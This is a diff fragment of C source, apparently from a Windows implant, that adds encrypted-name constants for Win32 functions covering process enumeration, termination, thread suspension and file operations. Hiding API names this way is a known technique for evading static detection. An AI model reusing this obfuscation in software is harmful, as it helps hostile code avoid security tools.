@@ -206,6 +206,27 @@ static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = MACRO_FUNC_GetUser
 static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = MACRO_FUNC_Sleep_ENCRYPTED_NAME
 static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME
 static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = MACRO_FUNC_ReadFile_ENCRYPTED_NAME
+static const BYTE FUNC_OpenProcess_ENCRYPTED_NAME[]         = MACRO_FUNC_OpenProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_TerminateProcess_ENCRYPTED_NAME[]    = MACRO_FUNC_TerminateProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_SuspendThread_ENCRYPTED_NAME[]       = MACRO_FUNC_SuspendThread_ENCRYPTED_NAME;
+static const BYTE FUNC_FormatMessageA_ENCRYPTED_NAME[]      = MACRO_FUNC_FormatMessageA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME[] = MACRO_FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME;
+static const BYTE FUNC_Process32First_ENCRYPTED_NAME[]      = MACRO_FUNC_Process32First_ENCRYPTED_NAME;
+static const BYTE FUNC_Process32Next_ENCRYPTED_NAME[]       = MACRO_FUNC_Process32Next_ENCRYPTED_NAME;
+static const BYTE FUNC_GetFileSize_ENCRYPTED_NAME[]         = MACRO_FUNC_GetFileSize_ENCRYPTED_NAME;
+static const BYTE FUNC_DeleteFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_DeleteFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_WriteFile_ENCRYPTED_NAME[]           = MACRO_FUNC_WriteFile_ENCRYPTED_NAME;
+static const BYTE FUNC_MoveFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_MoveFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_CopyFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_CopyFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_FindFirstFileW_ENCRYPTED_NAME[]      = MACRO_FUNC_FindFirstFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindNextFileW_ENCRYPTED_NAME[]       = MACRO_FUNC_FindNextFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindClose_ENCRYPTED_NAME[]           = MACRO_FUNC_FindClose_ENCRYPTED_NAME;
+static const BYTE FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_CreateDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_RemoveDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_RemoveDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_CreateFileA_ENCRYPTED_NAME;
+
 
 
 /*
